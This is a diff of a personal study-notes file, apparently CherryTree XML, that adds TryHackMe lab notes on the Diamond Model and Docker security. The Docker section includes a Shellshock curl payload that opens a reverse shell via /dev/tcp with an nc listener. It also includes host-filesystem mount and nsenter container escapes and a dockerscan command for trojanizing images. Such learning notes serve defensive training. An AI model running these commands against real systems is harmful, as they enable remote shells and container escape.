@@ -3722,7 +3722,7 @@ IAM Roles
     <node name="Telemetry (Prom &amp; Graf)" unique_id="130" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1672430910" ts_lastsave="1672431148">
       <rich_text>collection of business and diagnosis data from the software in prod, and store and visualize it for eht purpose of diagnostic</rich_text>
     </node>
-    <node name="Linux" unique_id="131" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1672680784" ts_lastsave="1683764972">
+    <node name="Linux" unique_id="131" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1672680784" ts_lastsave="1686616588">
       <rich_text>Linux
 - Operating system, is in middle of your hardware and users
 - linux born in 1991
@@ -4674,6 +4674,7 @@ Management and run levels
       ⇒ vgextend {group vg} {new volume}
       ⇒ lvextend -L+1024 {/dev/mapper}/{logical volume}
       ⇒ xfs_growfs
+      ⇒ /dev/db_mysql/mysql_data
 - Swap
    → amount fo physical memory
    → recommend: 
@@ -6752,7 +6753,7 @@ Anexo A (los controles 4 al 10 son mandatorios para obtener la certifciacion)
       <rich_text>IOT puede ser parte de un frontend</rich_text>
     </node>
   </node>
-  <node name="TryHackMe" unique_id="149" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1685939072" ts_lastsave="1686332462">
+  <node name="TryHackMe" unique_id="149" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1685939072" ts_lastsave="1686592370">
     <node name="Pyramid of pain" unique_id="150" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1685939081" ts_lastsave="1685940575">
       <rich_text>6 levels:
 - Hash Values (Trivial)
@@ -6961,7 +6962,7 @@ Phase: Out (action on objectives)
 - objectives
    → depending the attacker get differents objectives, money, release private and confidential information</rich_text>
     </node>
-    <node name="Diamond Model" unique_id="157" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1686332462" ts_lastsave="1686534823">
+    <node name="Diamond Model" unique_id="157" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1686332462" ts_lastsave="1686794661">
       <rich_text>Created by cibersecurity professionals in 2013
 four core features:
 - adversary
@@ -6980,7 +6981,67 @@ Adversary
 - named attacker, enemy, cyber threat actor or hacker
 - is an actor or organization responsible for utilizing a capability against the civtim to achieve their intent
 - is difficult identify an adversary during the first stages
-- adversary operator: </rich_text>
+- adversary operator: hacker or person(s) conducting the instrusion activity
+- adversary customer, entity that stands to benefit from the activity conducted in the intrusion
+
+Victim
+- target of adversary, organization, person, target email, IP, domain
+- victim personae, people or organizations being targeted, organization names, people's names, industries, job roles, interests
+- victim assets are the attack surface and include the set of systems, networks, email addresses, hosts, IP addresses, social networking accounts
+
+Capability
+- skills, tools and techniques used by the adversary, are TTPs
+- included from less sophisticated methods, such as manual password guessing, to most sophisticated, like developing malware or a malicious tools
+- capability capacity vulnerabilities and exposures is used
+- adversary arsenal, set of capabilities, combinated capacities of adversary's capabilities
+
+Infrastructure
+- software or hardware, physical or logical interconnections that the adversary uses to deliver a capability or mantain control of capabilities
+- is possible be IP addresses, domain names, email addresses or USB device
+- Types:
+   → 1; controlled or owned by the adversary
+   → 2; controlled by intermediary, type of obfuscating the source and attribution of the activity, inclues malware staging server, malicious domain names, compromised email accounts
+   → service providers are organizations that provide services considered critical for the adversary availabilityof tyep 1 an type 2, ISP, domain registrars and web mail providers
+
+Event meta features
+- six possible meta-features, is not required but they can add some value information
+   → Timestamp
+      ⇒ date and time of the event.
+      ⇒ each event can be recorded
+      ⇒ include start and stop event
+      ⇒ is used to determine patterns and group
+   → Phase
+      ⇒ every malicious activity contains two or more phases which must be successfilly executed in succession to achieve the desired result", this is used with phases of Cyber kill chain
+   → Result
+      ⇒ they are helpful to capture
+      ⇒ it is crucial to capture the results and post-conditions of an adversary, sometimes they might not always be known
+      ⇒ the event can be labelled as, success, failure or unknown
+   → Direction
+      ⇒ describe host-based and network-based event and represents the direction of the intrusion attack
+      ⇒ define seven values for this meta:
+         • victim to infrastructure
+         • infrastructure to victim
+         • infrastructure to infrastructure
+         • adversary to infrastructure
+         • infrastructure to adversary
+         • bidirectional
+         • unknown
+   → Methodology
+      ⇒ will allow an analyst to describe the general classification of intrusion
+   → Resources
+      ⇒ needs one or more external resources to be satisfied to succed
+      ⇒ example of use:
+         • software
+         • knowledge
+         • information
+         • hardware
+         • funds
+         • facilties
+         • access
+
+Social-political component
+- the needs and intent of the adversary, money, 
+- </rich_text>
     </node>
     <node name="Vulnversity" unique_id="153" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1686027971" ts_lastsave="1686028576">
       <rich_text>Use of nmap to scan machine:
@@ -6995,6 +7056,89 @@ execute with gobuster dir -u </rich_text>
     <node name="Burp suite" unique_id="154" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1686032173" ts_lastsave="1686032435">
       <rich_text>is aframework written in Java to web application penetretion testing, this is a standard tool, used to testing APIs
 this can capture and manipulate all of the traffic between an attacker and a webserver</rich_text>
+    </node>
+    <node name="The Docker Rodeo" unique_id="158" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1686592370" ts_lastsave="1686792105">
+      <rich_text>to get data from docker registry
+curl -X GET </rich_text>
+      <rich_text link="webs http://docker-rodeo.thm:5000/v2/_catalog">http://docker-rodeo.thm:5000/v2/_catalog</rich_text>
+      <rich_text>
+curl -X GET </rich_text>
+      <rich_text link="webs http://docker-rodeo.thm:5000/v2/repository/name/tags/list">http://docker-rodeo.thm:5000/v2/repository/name/tags/list</rich_text>
+      <rich_text>
+curl -X GET </rich_text>
+      <rich_text link="webs http://docker-rodeo.thm:5000/v2/_catalog">http://docker-rodeo.thm:5000/v2/</rich_text>
+      <rich_text>cmnatic/myapp1/manifest/notsecure
+
+use of dive to check layers of docker image
+
+check on open port curl </rich_text>
+      <rich_text link="webs http://{ip}:{port}/version">http://{ip}:{port}/version</rich_text>
+      <rich_text>
+to check status of docker: docker -H tcp://{ip}:{port} ps
+mount host volumes docker run -v /:/mnt --rm -it alpine chroot /mnt sh, scale priviledges
+
+three groups to isolate containers:
+- namespaces
+- cgroups
+- overlayFS
+
+Process can only see the process in the same namespaces, in theory no conflicts
+
+nsenter --target 1 --mount sh, used to access to process ID 1 and mount using shell in this process
+
+some notes:
+- use of the principle of least privileges
+- docker secom 101: feature of linux kernel, use of docker uses security profiles
+- use of certifications in daemon
+
+Hacking and securing docker containers
+Cgroups is a feature of the linux kernel
+resources such as CPU, RAM, IOPS and network
+we can enforce limits and contraints on docker cntainers too
+limit PIDs to prevent fork bombs
+
+to avoid fork bombs use = --pids-limit {number} in docker run
+
+namespaces
+isolation is one the fundamental aspects for containers
+docker uses namespaces
+docker engines uses:
+PID, process isolation
+NET, manging network interfaces
+IPCm access to IPC resources
+MNT, filesystem mount points
+UTS, isolation kernel and version identifiers
+User Id, privilege isolation
+avoid use of UID=0 and GID=0
+
+dockerd --userns-remap=default &amp;, with this the docker changes of permissions
+cat /etc/subuid
+cat /etc/subgid
+
+Docker attack surface
+- elevate priviledges
+- direct attak to docker, still in k8s
+- enterprises typically use private repositories
+- docker publicly known vulnerabilities that could be intentional or unintentional
+- </rich_text>
+      <rich_text link="webs https://hub.docker.com/r/vulnerables/cve-2014-6271/">https://hub.docker.com/r/vulnerables/cve-2014-6271/</rich_text>
+      <rich_text>
+- access using nc
+   → curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'bash -i &gt;&amp; /dev/tcp/{ip docker0}/{port} 0&gt;&amp;1'" </rich_text>
+      <rich_text link="webs http://localhost:8080/cgi-bin/vulnerable">http://localhost:8080/cgi-bin/vulnerable</rich_text>
+      <rich_text>
+   → open port with nc: nc -nlvp {port(same of curl)}
+
+backdooring
+- malicous code is not a new concept
+- common in windows executables as well mobile apps
+- dockerscan is a tool with check this problems
+- docker scan modify images: dockerscan image modify trojanize {original image} -l {ip} -p {port} -o {ouput image}
+
+Privilege escalation
+- docker daemon requieres root privileges to perform some of its operations
+- if one user is part of docker group, it is possible elevate his privileges
+- use of setuid binaries to achieve this</rich_text>
     </node>
   </node>
   <node name="English" unique_id="32" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1624747640" ts_lastsave="1685941303">
